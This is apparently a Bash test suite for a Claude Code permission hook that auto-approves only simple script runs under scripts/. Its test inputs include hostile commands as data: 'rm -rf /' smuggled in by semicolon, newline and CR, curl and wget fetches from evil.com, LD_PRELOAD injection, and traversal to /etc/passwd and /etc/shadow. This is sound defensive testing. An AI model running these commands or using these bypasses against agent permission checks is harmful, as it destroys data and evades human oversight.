#!/bin/bash
# .claude/hooks/test-permission-fallback.sh
#
# PermissionRequest hook のテスト（拡張版）
# 使用法: bash .claude/hooks/test-permission-fallback.sh

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
HOOK="$SCRIPT_DIR/permission-fallback.sh"
PASS=0; FAIL=0

test_case() {
  local cmd="$1" expected="$2" desc="$3"
  local input="{\"tool_input\":{\"command\":\"$cmd\"},\"tool_name\":\"Bash\",\"hook_event_name\":\"PermissionRequest\"}"
  local output
  output=$(echo "$input" | bash "$HOOK" 2>/dev/null)

  if [ "$expected" = "allow" ]; then
    if echo "$output" | jq -e '.hookSpecificOutput.decision.behavior == "allow"' >/dev/null 2>&1; then
      ((PASS++))
    else
      echo "FAIL [$desc]: expected allow, got: $output"
      ((FAIL++))
    fi
  elif [ "$expected" = "dialog" ]; then
    if [ -z "$output" ]; then
      ((PASS++))
    else
      echo "FAIL [$desc]: expected dialog (empty), got: $output"
      ((FAIL++))
    fi
  fi
}

# test_case_raw: accepts pre-built JSON (for cases with control chars, custom tool_name, etc.)
test_case_raw() {
  local input="$1" expected="$2" desc="$3"
  local output
  output=$(printf '%s' "$input" | bash "$HOOK" 2>/dev/null)

  if [ "$expected" = "allow" ]; then
    if echo "$output" | jq -e '.hookSpecificOutput.decision.behavior == "allow"' >/dev/null 2>&1; then
      ((PASS++))
    else
      echo "FAIL [$desc]: expected allow, got: $output"
      ((FAIL++))
    fi
  elif [ "$expected" = "dialog" ]; then
    if [ -z "$output" ]; then
      ((PASS++))
    else
      echo "FAIL [$desc]: expected dialog (empty), got: $output"
      ((FAIL++))
    fi
  fi
}

echo "=== Basic Allow Cases ==="
test_case "python3 scripts/foo.py" allow "python3 + relative"
test_case "python3 ./scripts/foo.py" allow "python3 + dotslash"
test_case "python3 .claude/skills/refine-iteratively/scripts/extract_metadata.py --file result.md" allow "python3 + deep path"
test_case "python3 $PROJECT_ROOT/scripts/foo.py" allow "python3 + absolute"
test_case "bash scripts/run.sh" allow "bash + relative"
test_case "bash ./scripts/validate.sh arg1 arg2" allow "bash + args"

echo ""
echo "=== sh Interpreter Support ==="
test_case "sh scripts/validate.sh" allow "sh + relative"
test_case "sh ./scripts/foo.sh" allow "sh + dotslash"

echo ""
echo "=== Compound Commands (CRITICAL) ==="
test_case "python3 scripts/foo.py; rm -rf /" dialog "semicolon injection"
test_case "python3 foo.py | grep scripts/" dialog "pipe"
test_case "python3 foo.py && echo done" dialog "AND operator"
test_case "python3 foo.py || exit 1" dialog "OR operator"
test_case "\$(python3 scripts/foo.py)" dialog "command substitution"
test_case "\`python3 scripts/foo.py\`" dialog "backtick substitution"

echo ""
echo "=== Inline Code Execution Guards ==="
test_case "python3 -c 'import os' scripts/x" dialog "python3 -c injection"
test_case "bash -c 'rm -rf /' scripts/x" dialog "bash -c injection"
test_case "sh -c 'malicious code' scripts/x" dialog "sh -c injection"
test_case "python3 -m ast scripts/test.py" dialog "python3 -m flag"
test_case "python3 --command 'code' scripts/x" dialog "python3 --command"

echo ""
echo "=== Redirection & Process Substitution ==="
test_case "python3 scripts/foo.py > output.txt" dialog "output redirect"
test_case "python3 scripts/foo.py < input.txt" dialog "input redirect"
test_case "python3 scripts/benign.py <<EOF" dialog "here-document"
test_case "bash scripts/run.sh <(echo test)" dialog "process substitution <()"
test_case "bash scripts/run.sh >(cat)" dialog "process substitution >()"
test_case "bash scripts/run.sh 2>&1" dialog "stderr redirect"

echo ""
echo "=== Environment Variable Prefix ==="
test_case "PYTHONPATH=/tmp/evil python3 scripts/foo.py" dialog "env var assignment"
test_case "PATH=/evil:\$PATH python3 scripts/foo.py" dialog "PATH manipulation"
test_case "LD_PRELOAD=/evil.so python3 scripts/x.py" dialog "LD_PRELOAD injection"
test_case "pythonpath=/evil python3 scripts/x.py" dialog "lowercase env var"

echo ""
echo "=== False Positive Risk ==="
test_case "curl http://evil.com/scripts/payload.sh" dialog "curl with scripts in URL"
test_case "wget http://evil.com/scripts/x" dialog "wget with scripts in URL"
test_case "rm scripts/important.sh" dialog "rm scripts file"

echo ""
echo "=== Case Sensitivity ==="
test_case "PYTHON3 scripts/foo.py" dialog "uppercase PYTHON3"
test_case "Python3 scripts/foo.py" dialog "mixed case Python3"
test_case "BASH scripts/run.sh" dialog "uppercase BASH"

echo ""
echo "=== Whitespace Edge Cases ==="
test_case "python3  scripts/foo.py" allow "double space"
test_case "python3   scripts/foo.py" allow "triple space"
test_case "python3scripts/foo.py" dialog "no space"

echo ""
echo "=== Interpreter Flags (safe - should allow) ==="
test_case "python3 -u scripts/test.py" allow "python3 -u (unbuffered)"
test_case "python3 -B scripts/test.py" allow "python3 -B (no .pyc)"

echo ""
echo "=== Unrelated Commands ==="
test_case "npm install" dialog "unrelated command"
test_case "python3 foo.py" dialog "python3 without scripts/"
test_case "git push" dialog "git push"
test_case "node scripts/test.js" dialog "node (not in allowed interpreters)"

echo ""
echo "=== Security Regression: E-01 Newline Injection ==="
test_case_raw '{"tool_input":{"command":"python3 scripts/foo.py\nrm -rf /"},"tool_name":"Bash","hook_event_name":"PermissionRequest"}' dialog "E-01: newline injection (JSON \\n)"
test_case_raw '{"tool_input":{"command":"python3 scripts/foo.py\n\nmalicious"},"tool_name":"Bash","hook_event_name":"PermissionRequest"}' dialog "E-01: double newline injection"

echo ""
echo "=== Security Regression: NEW-02 CR Injection ==="
test_case_raw '{"tool_input":{"command":"python3 scripts/foo.py\rrm -rf /"},"tool_name":"Bash","hook_event_name":"PermissionRequest"}' dialog "NEW-02: carriage return injection"
test_case_raw '{"tool_input":{"command":"python3 scripts/foo.py\r\nrm -rf /"},"tool_name":"Bash","hook_event_name":"PermissionRequest"}' dialog "NEW-02: CRLF injection"

echo ""
echo "=== Security Regression: E-02 Path Traversal ==="
test_case "python3 scripts/../../../etc/passwd" dialog "E-02: path traversal escape project"
test_case "python3 scripts/../../etc/shadow" dialog "E-02: path traversal double .."
test_case "python3 scripts/sub/../foo.py" allow "E-02: path traversal stays in scripts/"
test_case "python3 ./scripts/../scripts/foo.py" allow "E-02: traversal resolves back to scripts/"

echo ""
echo "=== Security Regression: E-03 Greedy Match Bypass ==="
test_case "python3 /tmp/evil.py scripts/foo.py" dialog "E-03: evil script before scripts/ arg"
test_case "python3 /tmp/scripts/evil.py" dialog "NEW-03: arbitrary /tmp/scripts/ directory"
test_case "python3 /opt/other/scripts/evil.py" dialog "E-03: outside project scripts/"

echo ""
echo "=== Security Regression: E-04 Dangerous Bash Flags ==="
test_case "bash --init-file /tmp/evil scripts/foo.sh" dialog "E-04: bash --init-file"
test_case "bash --rcfile /tmp/evil scripts/foo.sh" dialog "E-04: bash --rcfile"
test_case "bash -i scripts/foo.sh" dialog "E-04: bash -i interactive"

echo ""
echo "=== Security Regression: E-05 No-Space Flag Bypass ==="
test_case 'python3 -c"import os" scripts/x' dialog "E-05: -c no space with code"
test_case 'python3 -cscripts/foo.py' dialog "E-05: -c masquerade as path"
test_case 'python3 -mhttp.server scripts/x' dialog "E-05: -m no space"
test_case 'python3 -e"import os" scripts/x' dialog "E-05: -e no space"
test_case "python3 --command code scripts/x" dialog "E-05: --command long form"
test_case "python3 --eval code scripts/x" dialog "E-05: --eval long form"

echo ""
echo "=== Security Regression: E-06 Variable Expansion ==="
test_case 'python3 scripts/$EVIL.py' dialog "E-06: dollar variable in path"
test_case 'python3 scripts/${EVIL}.py' dialog "E-06: brace variable in path"
test_case 'python3 scripts/$[1+1].py' dialog "E-06: arithmetic expansion"

echo ""
echo "=== Security Regression: E-07 Substring Match ==="
test_case "python3 evil_scripts/payload.py" dialog "E-07: evil_scripts/ directory"
test_case "python3 myscripts/foo.py" dialog "E-07: myscripts/ directory"
test_case "python3 notscripts/foo.py" dialog "E-07: notscripts/ directory"

echo ""
echo "=== Security Regression: E-08 tool_name Check ==="
test_case_raw '{"tool_input":{"command":"python3 scripts/foo.py"},"tool_name":"Write","hook_event_name":"PermissionRequest"}' dialog "E-08: tool_name=Write"
test_case_raw '{"tool_input":{"command":"python3 scripts/foo.py"},"tool_name":"","hook_event_name":"PermissionRequest"}' dialog "E-08: tool_name empty"
test_case_raw '{"tool_input":{"command":"python3 scripts/foo.py"},"hook_event_name":"PermissionRequest"}' dialog "E-08: tool_name missing"

echo ""
echo "=== Extended Safe Flags ==="
test_case "python3 -u -B scripts/test.py" allow "multi-flag: -u -B"
test_case "python3 -s scripts/test.py" allow "python3 -s flag"
test_case "python3 -v scripts/test.py" allow "python3 -v flag"

echo ""
echo "=== Security Review: Tilde Expansion ==="
test_case "python3 ~/scripts/foo.py" dialog "tilde home expansion"
test_case "python3 ~root/scripts/foo.py" dialog "tilde user expansion"
test_case "python3 ~+/scripts/foo.py" dialog "tilde PWD expansion"

echo ""
echo "=== Security Review: Glob Characters ==="
test_case "python3 scripts/*.py" dialog "glob wildcard"
test_case "python3 scripts/?.py" dialog "glob single-char wildcard"
test_case 'python3 scripts/{a,b}.py' dialog "brace expansion"

echo ""
echo "=== Path Normalization ==="
test_case "python3 ./scripts/foo.py" allow "dotslash normalization"
test_case "python3 scripts/./foo.py" allow "mid-path dot normalization"
test_case "python3 scripts/subdir/../foo.py" allow "mid-path traversal resolves in scripts/"

echo ""
echo "=== RESULTS ==="
echo "Passed: $PASS"
echo "Failed: $FAIL"
[ $FAIL -eq 0 ] && echo "All tests passed!" || exit 1
